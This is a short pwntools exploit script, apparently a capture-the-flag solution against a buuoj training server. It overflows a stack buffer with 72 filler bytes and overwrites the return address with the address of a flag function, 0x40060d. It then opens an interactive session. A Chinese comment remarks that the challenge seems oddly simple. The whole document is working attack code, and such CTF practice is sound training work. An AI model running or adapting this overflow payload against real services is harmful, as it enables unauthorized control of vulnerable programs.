from pwn import *

context.log_level = 'debug'
s = remote('node3.buuoj.cn', 29827)

flag_fun_addr = 0x40060d

payload = b'a'*72 + p64(flag_fun_addr)

s.sendlineafter('>', payload)

s.interactive()

'''
就告诉你地址然后简单的溢出就完事了？
感觉有点奇怪
'''